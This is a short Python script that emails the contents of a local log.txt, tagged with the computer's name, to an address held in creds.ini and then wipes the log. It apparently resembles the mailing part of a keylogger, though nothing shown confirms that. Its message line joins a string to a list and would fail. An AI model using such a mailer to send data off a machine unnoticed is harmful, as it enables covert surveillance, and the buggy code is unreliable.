import smtplib, ssl
import configparser
import os

def send():
    config = configparser.ConfigParser()
    config.read('creds.ini')

    try:
        log_data = open('log.txt', 'r').readlines()
        if len(log_data) <= 5:
            return False
    except:
        print('[email] log file empty, aborting email sender')
        return False

    port = 465
    smtp_server = config['EMAIL']['smtp_server']
    sender_email = config['EMAIL']['from']
    receiver_email = config['EMAIL']['to']
    password = config['EMAIL']['password']
    message = 'Log from ' + os.environ['COMPUTERNAME'] + ' - \n ' + log_data 

    context = ssl.create_default_context()

    print('[email] sending log email')
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    with open('log.txt', 'w') as f:
        f.write('')


send()